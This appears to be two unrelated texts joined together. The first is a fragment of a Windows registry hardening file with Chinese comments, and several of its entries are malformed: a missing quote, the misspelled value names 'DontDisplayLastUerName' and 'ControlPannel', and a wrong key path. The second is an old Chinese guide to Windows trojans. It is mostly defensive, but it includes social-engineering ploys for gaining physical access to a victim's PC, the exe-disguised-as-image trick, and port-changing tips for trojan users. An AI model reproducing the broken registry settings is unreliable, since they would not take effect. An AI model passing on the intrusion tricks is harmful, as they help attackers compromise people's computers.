[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA] 
"LMCompatibilityLevel"=dword:00000002 

; 禁止使用DCOM,可以运行"DCOMCNFG.EXE"程序，在默认属性中不选择'enable distributed COM on this computer' 
; 或设置如下键值取消DCOM服务 
[HKEY_LOCAL_MACHINE\Software\Microsoft\Ole] 
"EnableDCOM"="N" 

; 禁止Null用户和guest账号访问运用程序事件日志 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Application] 
"RestrictGuestAccess=dword:00000001 

; 禁止Null用户和guest账号访问安全事件日志 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\Security] 
"RestrictGuestAccess=dword:00000001 

; 禁止Null用户和guest账号访问系统事件日志 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog\System] 
"RestrictGuestAccess=dword:00000001 

; 禁止在登录框中显示上次登录用户 
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] 
"DontDisplayLastUerName"="1" 

; 禁止在登录的交互时访问软驱 
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon] 
"AllocateFloppies"="1" 

; 禁止在登录的交互时访问光驱 
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] 
"AllocateCDRoms"="1" 

; 系统关闭后清除虚拟交换档 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management] 
"ClearPageFileAtShutdown"=dword:00000001 

; 禁止缓存当前登录信任 
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] 
"CachedLogonsCount"="1" 

; 使能屏幕保护锁定 
[HKEY_USERS\DEFAULT\ControlPannel\Desktop] 
"ScreenSaveActive"="1" 

; 禁止光盘的Autorun 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Cdrom] 
"Autorun"=dword:00000000 

; To make IIS server run CGI scrits in the context of the IIS IUSR_computername account 'un-rem' this. 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters] 
"CreateProcessAsUser"=dword:00000001 

; 使能将http的成功登录记录记载为日志，不过小心大家的硬盘空间哦 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters] 
"LogSuccessfulRequests"=dword:00000001 

; 使能将http的错误请求记录入日志 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters] 
"LogErrorRequests"=dword:00000001 

; 使IIS FTP bounce 攻击失效 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\MSFTPSVC\Parameters] 
"EnablePortAttack"=dword:00000000 ——————————
木马指南
1.这篇文章关于什么？
在这篇文章里，我将向你解释木马及其未来的一些令人感兴趣的事情.我希望你能认识到木马是危险的，
它仍是一个很大的安全问题.尽管许多人说不从网络上下载文件你将不会感染木马，这是不正确的.我在这儿
想解释的是木马有将来及其一些令人感兴趣的事.这篇文章只是为基于WINDOWS平台而非UNIX的木马准备.
2.木马是什么？
包含在合法程序里的未授权的程序.该未授权的程序执行用户未知（很可能不想）的功能.
一个合法的但是已经被改动的程序，在它里面包含有未授权的代码，这段代码执行用户未知（很可能不想的功能.
任何看起来执行想要和必须的功能（因为里面的未授权代码对用户是未知的）而实际执行一些用户未知
（很可能不想）的功能.
TROJANS也能叫做RAT's或远程管理工具（Remote Administration Tools），TROJAN的名字来自古老的神话故事：
希腊人在战争中如何给他们的敌人一个很大的木马做为礼物，他们接受了这个礼物，把木马带进了他们的王国，
在晚上，希腊士兵冲出了木马，向城市发动了进攻，完全征服了它.
3.木马的今天
特洛伊木马一直是一个大的安全问题，即使在如今也是.绝大多数人不知道木马为何物，他们不停从可疑
的人或不可信的地方下载文件.如今在网上有多于600种我所知的木马，我想实际会比这多的多，因为如今的每一
个黑客和程序员都有自己的为了他（她）特定需要没在任何地方公布的木马.每个黑客小组都有他们自己的木马
和程序.当有人开始学WINSOCK编程的时候，最先生成的通常是聊天客户端软件和木马.即使有反病毒扫描器（我
将在下面谈到），人们仍旧会被感染，被自己，被某些黑客，或被一些朋友.
4.木马的将来
我想有许多人们认为木马已经过时，没有前途，我不这样认为.木马将总是有前途，新东西会加到里面，在
木马中有如此多的东西可以被有技巧的程序员改善.
有新的选项和更好的加密方法的木马每天都在由程序员制造，以致防木马软件不能检测到它们.因此，没有
人知道在网上有多少木马.但是程序员仍在编制木马，他们在将来也会继续.从技术上来说，木马几乎可以在任何
地方任何操作系统或硬件平台上出现，然而在前面提到的室内工作除外.木马的广泛传播很象病毒，来自因特网
的软件下载，尤其是共享和免费软件，总是可疑的，类似地，来自地下组织服务器或用户新闻组的材料也在侯选
之列.有成千上万的软件没有检查来源，新程序特别是免费软件每天都在出现，他们可能都是木马.因此，留心你
正在下载什么，正从哪儿下载，总是从正式的页面下载软件.
5.防病毒扫描器
人们认为，当他们有了有最新的病毒定义的防病毒扫描器之后，他们在网上就是安全的，他们将不会感染
木马或没有人可以访问.
他们的计算机.这种观点是不正确的.防病毒扫描器的目的是检测病毒而不是木马.但是当木马流行的时候，
这些扫描器也开始加一些木马的定义，他们不能发现木马并分析他们，这就是他们为什么只能检测常用和广为
人知的木马比如BO和NETBUS或少数几个其他的.正如我说的，木马有大约600种，而这些扫描器只能检测他们中
极少的一部分.这些扫描器不是可以阻止试图连接你的电脑或试图攻击你（正如人们认为他们那样）的防火墙.
因此，我希望你明白这些扫描器的主要目的不是当你上线的时候检测木马并保护你.绝大多数的因特网用户只知
道BO和NETBUS是特洛伊木马，有一些特定的工具只能清除这些木马，人们就认为他们是安全的能受保
护不感染每一个木马.
6.我怎么会感染木马？
每个人都问这个问题，人们经常问他们自己怎么会感染上木马，也有一些人问的时候，他们确实运行了
某些由别人发送或从某个地方下载的文件，人们总是说他们不会运行任何东西或下载某些文件，但是他们做了.
人们总是在上线的时候不注意一些事情,这就是为什么他们会忘记他们感染木马是在什么时候.
你会在任何地方受感染，在这里我会试图解释这些事情：
---从ICQ
---从IRC
---从附件
---从物理访问
---从诡计
6.1 从ICQ
人们认为当他们正用ICQ交谈的时候不会感染，然而，他们忘记了某人给他们发送文件的时刻.每个人都知
道ICQ有多不安全，这就是为什么那么多人害怕使用它.正如你所知道的，ICQ有一个BUG让你可以发送EXE文件
给某人，但是文件看起来是BMP或JPG或不管你想让它看起来象什么的东西.这是非常危险的，正如你明白的，
你会陷入麻烦.攻击者将只是把文件的图标改成象一个BMP图象，告诉你它是他的相片，将它重命名为photo.bmp，
接着你会得到它，当然，在得到它之前你会看到bmp图象，此时你是安全的，因为它还没有被执行，接着你运行
它看照片，你认为没有什么可担心的，其实有. 
那是为什么绝大多数人说他们不运行任何文件，因为他们知道他们运行了一个图片而不是可执行文件.一
个防止这个ICQ里的BUG的方法是在运行之前总是检查文件的类型，它可能有一个BMP的图标但是如果文件类
型写着可执行，我想你知道如果你运行它的话将是一个错误.
6.2 从IRC
你也可能从IRC上通过接收不可信来源文件而感染木马.我建议你应该总是paranoid，不接收来自任何人
甚至是你的最好的朋友的文件，因为有人可能偷取了他（她）的密码而来感染你.当有人问某人某些事如一个
秘密或别的只有他（她）知道的事时，他（她）认为他（她）可以100%的确信问的那个人是他（她）的朋友，
正如我告诉你paranoid，因为有人可以感染你的朋友并检查他（她）的IRC日志，看秘密是什么或了解其他的
事情.正如我所说，paranoid是更安全的，不要接受任何来自在IRC上的任何人的文件或其他地方如EMAIL，
ICQ，甚至你的在线朋友.
6.3 从附件
同样的事情也会伴随EMAIL附件发生.不要运行任何东西即使它说你将会看到热辣的色情作品或一些服
务器的密码或别的什么东西.用木马感染某人最好的方法是向服务器投递大量的EMAIL，因为在网上有很多新
手，他们当然会受感染.这是最好的感染办法--如我所说：为什么它是想感染大众的人的首选方法. 
6.4 物理访问
当你的”朋友“可以物理访问你的计算机的时候，你当然会被感染.让我们假定你丢下某人在你
的电脑旁5分钟，那么你当然会被你的"朋友“中的某人感染.有一些非常精明的人，时刻想着物理访问某人
的电脑的新方法，下面是一些有趣的诡计：
1.你的”朋友“可能请你”嗨兄弟，能给我一点水吗？“或其他的可以让他单独呆着的事情，你会去取
点水，接着..你知道会发生什么.
2.攻击者可能有一个计划.比方你邀请他（她）12：00在你的家里，他会叫你的一个”朋友“在12：15给
你打电话和你谈一些事情，攻击者又有时间感染你了.也可以是：给你打电话的”朋友“说一些如”有人
在你身边吗？如果有的话，不如移到其他地方，我不想让任何人听到我们的谈话“，这样，攻击者又单独
呆着有时间感染你了.
6.5 诡计
这是一个对真想要些什么的人起作用的诡计，当然攻击者知道它是什么.比方说受害人想看色情作品
或***密码，那么，攻击者会在受害人屋子前留下一个含有木马的软磁盘，当然会将木马和XXX图片放在
一起.这是一个坏事情，因为有时候你真的想要某些东西，并且最后发现了它.
7.木马会有多危险？
许多不知道木马是什么的人认为当他们运行一个可执行文件的时候什么都没有发生，因为他们的电脑仍
旧还在工作，所有的数据都还在.如果上病毒的话，他们的数据将被毁坏，电脑将不再工作.
有人正在你的电脑上上传和下载文件；有人正读你所的IRC日志，了解你和你朋友的有趣的事情；有人
正读你的所有的ICQ消息；有人正删除你电脑上的文件....
这是一些显示木马有多危险的例子.人们只是在被感染的机器上用木马代替如CIH一样的病毒，然后毁坏机器.
8.不同种类的木马
--远程控制型木马：
这是现在最流行的木马.每个人都想有这样的木马，因为他们想访问受害人的硬盘.RAT'S (remote access
trojans)使用起来非常简单，只需要某人运行服务器，你得到受害人的IP，你对他或她的计算机有完全的访问
权.你能做一些事情，它依赖于你使用的木马.但是，RAT'S有通常的远程控制木马的功能如：KERLOGGER，上传
和下载，MAKE A SCREEN SHOT等等.有人将木马用于恶意的目的，他们只是想删除又删除....
这是LAME.但是我有一个关于使用木马最好方法的指南，你应该读它.有很多用于检测最常用木马的程序，
但是新木马每天都出现，这些程序不是最好的防御.木马总是做同样的事情.如果每次WINDOWS重新启动的时候，
木马重启，这意味着它放了什么东西在注册表或WIN.INI或其他的系统文件里，因此它能重启.木马也可能在
WINDOWS系统目录里生成一些文件，这些文件总是看起来象一些受害人认为是正常的WINDOWS可执行文件.绝大
多数木马隐瞒任务表Most trojans hide from the Alt+Ctrl+Del menu，有人只用ALT+CTRL+DEL来看哪些进
程正在运行，这是不好的.有程序会正确地告诉你进程和文件来自哪儿，但是有一些木马（正如我跟你所说）
使用伪造的名字，对有些人来说，要决定哪个进程应该杀死是有一点困难的.
远程控制木马打开一个端口让每一个人都可以连上你的电脑.有些木马有些选项象改变端口和设置密码以
使只有那个感染你的家伙可以使用你的电脑.改变端口选项是非常好的，因为我确信你不想让你的受害人看见
他的电脑上的端口31377是开着的.远程控制木马每天都在出现，而且将继续出现对那些使用这样的木马的人：
小心感染你自己，那么那些你想毁灭的受害人将会报复，你将会感到难过.
--发送密码型木马：
这些木马的目的是得到所有缓存的密码然后将他们送到特定的EMAIL地址，不不让受害者知道 e-mail.绝大
多数这种木马在WINDOWS每次加载的时候不重启，他们使用端口25发送邮件.也有一些木马发送其他的信息如
ICQ，计算机信息等等.如果你有任何密码缓存在你电脑的任何地方，这些木马对你是危险的.
--Keyloggers：
这些木马是非常简单的，他们做的唯一的事情就是记录受害人在键盘上的敲击，然后在日志文件中检查
密码.在大多数情况下，这些木马在WINDOWS每次加载的时候重启，他们有象在线和下线的选项，当用在线选
项的时候，他们知道受害人在线，会记录每一件事情.然而，当用下线选项的时候，WINDOWS开始后被写下的
每一件事情会被记录并保存在受害人的硬盘等待传送.
--破坏型木马：
这种木马的唯一功能是毁坏和删除文件，使得他们非常简单易用.他们能自动删除你计算机上所有的DLL，
EXE，INI文件.这是非常危险的木马，一旦你被感染，毫无疑问，如果你没有清除，你的计算机信息将不再存在. 
--FTP型木马：
这种木马在你的电脑上打开端口21，让任何有FTP客户软件的人都可以不用密码连上你的电脑并自由上传和
下载.这些是最常用的木马，他们都是危险的，你应该小心使用他们.
9.谁会感染你？
基本上，你会被每个知道会如何使用木马（这非常简单）当然知道怎么感染你的人感染.使用木马的人是仅
仅停留在使用木马阶段的黑客，他们中的一些人不会走到下一个阶段，他们是只能使用木马（正如我所说这非
常简单）的LAMERS，但是，读了这篇文章后，你将知道别人用木马感染你的最常用方法，它将使那些想用木马
感染你的人感到困难.
10.攻击者要找什么？
你们中的一些人可能认为木马只用来搞破坏，他们也能用来刺探某人的机器，从里面取走很多私人信息.
攻击者取的信息将包括但不限于下列常用数据：
----信用卡信息
----信贷信息
----常用帐号信息
----任何帐号数据
----数据库
----邮件列表
----私人地址
----EMAIL地址
----帐号密码
----个人简历
----EMAIL信息
----计算机帐号或服务订阅信息
----你或你的配偶的姓名
----子女的姓名年龄
----你们的地址
----你们的电话号码
----你写给别人的信
----你家庭的照片
----学校作业
----任何学校的帐号信息
11.木马如何工作？
在这儿我会向你解释木马是如何工作的，如果你有些单词不了解，你可以查阅“文章中常用术语”部分.
当受害人运行木马服务器的时候，它确实在做些什么，如打开某个特定端口监听连接，它可以使用TCP或UDP
协议.当你连上受害人的IP地址时，你可以做你想做的事，因为你放了木马的计算机上的服务器让你这么做.
一些木马每次在WINDOWS被加载的时候重启，他们修改WIN.INI或SYSTEM.INI，因此他们可以重启，但是大多
数新木马使用注册表完成相应功能.木马象客户和服务器一样相互通信，受害人运行服务器，攻击者使用客户
向服务器发送命令，服务器只是按客户说的去做.
13.不用扫描器如何监视自己的计算机？
大众认为当他们有木马和防病毒扫描器时他们就是安全的，最好的检测木马的方法是自己动手，你不能
确信木马扫描器是否正确地工作因此开始自己检测.在这篇文章里我已经包含了软件和课程评论的列表，它
们将有助于你自己检测你的机器是否有木马.你总需要检测你的系统看什么端口开着，如果你看到有一个常用
木马端口开着，你很可能已经感染了木马.
**注解**
你可以在DOS方式下使用NETSTAT或用其他的软件做这件事.
**注解**
总是注意你的电脑上有什么文件在运行，检查它里面的一些可疑的东西如它的名字.我想你会检测象
config.EXE，himem.exe，winlilo.exe或其他一些有趣的文件，Hex Edit them，如果你发现一些有趣的东西
如SchoolBus Server，立刻杀死他们.确信你在监视注册表并时刻检查它里面新的变动，确信你在监视
system.ini或win.ini，因为仍旧有很多木马从它们重启.正如我告诉你的下载一些广为人知的程序如ICQ或
MIRC总要从其官方主页下载.遵循这些简单的规则将有助于防止你的电脑感染上木马.
14.帮助你监视自己的电脑的软件
正如我告诉你的我已经包含了可以帮助你监视自己的计算机防止木马感染的软件的列表.
++++++++++++++++
----LogMonitor+
++++++++++++++++
文件和目录监视工具 
Version: 1.3.4
Home page: http://www.geocities.com/koenigvad/Eng/
Author: Vadim Dumbravanu, koenigvad@yahoo.com
Log Monitor是一个文件和目录监视工具，它定期检查选定文件的修改时间，运行外部程序看是否文件已被
改变.对目录而言，它处理象文件改动，添加或删除.
平台：Windows 95/98/NT
自由供个人和商业使用，看LICENSE.TXT得到版权信息.文件包含下列主题：
--1.目的
--2.用法
--3.特性
--4.安装
--5.反安装
1.目的
程序的目的是让不同的管理员使用自动处理程序.有时候这些自动处理程序会停止工作甚至异常终止，处理
程序生成或更新错误的日志文件.Log Monitor会由他们的日志文件监视这样的处理程序，向管理员发出问题警告.
2.用法
绝大多数处理程序跟踪日志文件，定期更新他们.因此，如果这些处理程序异常终止，日志文件停止改变.如果
处理程序在选定的时段没有更新日志文件，Log Monitor会运行一个外部程序，可能是net send bla bla bla或内
存分页程序或进程重启.如果文件也被改变，Log Monitor会运行一个程序，因此你可以检查文件是否改变.Log 
Monitor也可以监视目录并处理目录下的文件的变化，添加和删除.Log Monitor也被用做一个任务调度程序，如果
你想比如每个小时运行一次任务，NT Scheduler Service是不符合要求的.使用Log Monitor你可以添加根本不存在
的文件，接着选定3600秒的时间段和程序，只要文件不更新，选定的程序将每个小时运行一次.在程序被启动
之前你可以定义运行时间和日期.
3.特性
好几个文件或目录可以同时被监视，每个文件有自己的时间，由独立的线程处理.监视进程的列表存储在配
置文件里.可以最小化到System Tray，也可以恢复.
有暂停监视选定文件的能力，“暂停”状态也可以存储在配置文件里.
依调度工作，可以只在选定的每周每月的时间间隔内检查文件和目录.
其他很多很好的特性...
++++++++++++
----PrcView+
++++++++++++
PrcView是一个可以显示广泛的现运行进程信息的免费进程查看工具，这些信息包括这样的细节：生成时间，
版本，选定进程使用的DLL文件的全路径，所有线程的列表，内存块和堆.PrcView也允许你杀死或附带一个调试
器到选定的进程，PrcView既可在WINDOWS 95/98也可在WINDOWS NT平台运行，程序包括窗口和命令行两个版本.
PrcView可以以带有最初的版权条款的压缩包形式并遵循非商业原则自由免费分发.
该程序由商业组织向第三方的分发和基于该 程序的工作必须经作者允许.如果你在运行该程序的时候遇到问题请
访问www.teamcti.com以获得最新版本，如果仍有问题，请发送一个简短的描述给IgorNys@writeme.com
----XNetStat
XNetStat是一个和DOS提示符下的NETSTAT一样的程序，该程序显示你计算机上所有打开的端口和已经建立的
连接，如果你需要或有任何疑问请MAIL：fresh@arez.com
++++++++++++
----AtGuard+
++++++++++++
AtGuard是一个有很酷特性的防火墙软件.它也能显示你的计算机中的哪个文件打开了一个向外的连接，如果
你想检测电脑上的木马，这是非常有用的.我丢失了该程序的URL，但是，你可以试着在altavista.com或
packetstorm.securify.com搜索一下.
+++++++++++++++++++++++++
-----ConSeal PC FIREWALL+
+++++++++++++++++++++++++
这款软件使你的PC更安全，相比其他基于PC的防火墙，它有一些超过它们的主要优势.在Windows 95, 
Windows 98 and Windows NT(3.51 & 4.0)上，它都可以使用.对WINDOWS机器，它可能是最好的防火墙，会
帮助你堵住你机器上的木马端口，也能抵御各种DOS攻击.
+++++++++++++++++
----LockDown2000+
+++++++++++++++++
这真是一个好的可以检测许多木马的工具包，它也作为防火墙可以保护你免受NUKE和ICQ攻击，还可以阻
止文件共享以使你不再有这方面的问题.它定期更新，加入很多新的木马定义.你想免受攻击和木马感染的话，
你必须拥有它.你可以在 www.lockdown2000.com处获得. 
++++++++++
----TDS-2+
++++++++++
TDS（Trojan Defence Suite）也是一个有很多功能和插件的反木马工具包，它也几乎检测所有木马并定
期更新.如果你想免受攻击和木马感染，这也是必须有的一个工具.你可以在www.tds.diamondcs.com.au处获得.
使用所有课程中提到到反木马工具包，将会构建一个安全的反木马的WINDOWS机器.
15.在程序中设置后门
使用木马感染别人的人正变得更聪明了，他们开始将木马设在一些每个人都使用的真实程序里面，因此，
他们可以感染受害者.绝大多数人知道当他们运行一个木马程序的时候，没有什么事情发生或出错信息出现，
但是，当木马被设进其他的程序的时候，这些程序正常工作，没有任何出错信息，受害者会认为他（她）没
有被感染.这是不正确的.程序员会把两个或更多的可执行部分合成一个生成程序，因此，他们可以将木马设
在一些每个人都知道的程序里.这些开放源代码的广为人知的程序也是危险的.好的程序员可以修改源代码使
它象一个木马，比方说，你正在使用被修改过的邮件客户.人所共知，发送密码型木马会使用端口25发送一些
包含有信息的邮件.想象如果攻击者修改了你的邮件客户把你的邮箱密码发送给他（她）会怎样.当然，你会
看见（如果你正在监视的话）端口25正开着，但是，很可能你不会注意，因为你正在发送邮件（正常情况下
发邮件时端口25开着），正如我所说，人们正变得越来越聪明.
16.建议
我的一些建议将帮助你免受木马或病毒感染：
-1.从不接收文件，即使来自你的朋友.你永远也不能确定电脑的另一端是谁.
-2.当执行文件的时候，首先检查它的类型，因为有些人可能设诡计让你运行它.
-3.总是监视你计算机上的开放端口和运行的文件.
-4.只从官方主页下载软件
-5.当玩木马的时候，你可能感染自己，因为木马创造者有时将木马服务器放在客户里，因此当你运行客户的
时候，你也被感染了.这又一次向你显示木马是很危险的，一旦你犯了错误，你会丢失一些敏感数据.
-6.变得paranoid会更安全.人们总是嘲笑那些烧掉他们每张纸片的人，他们将所有的密码放在头脑里，并使
用加密，不用ICQ或IRC，因为他们知道这些协议是多么脆弱.

